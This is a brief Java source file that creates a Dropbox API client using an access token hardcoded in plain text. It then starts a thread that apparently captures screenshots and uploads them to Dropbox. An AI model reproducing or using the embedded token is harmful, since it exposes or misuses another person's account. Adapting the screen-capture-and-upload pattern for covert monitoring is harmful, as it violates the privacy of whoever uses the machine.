import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.Buffer;
import java.text.SimpleDateFormat;
import java.util.*;

public class Main {
    public static void main(String[] args) throws IOException, AWTException {
        String ACCESS_TOKEN = "nVbb4_VZsncAAAAAAAAAASKNRvePaQXtZr5SqLgj4_m0OsJdRxm7DAaPFpWG9wtM";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        ScreenshotTread screenshotTread = new ScreenshotTread(client);
        screenshotTread.start();
    }
}


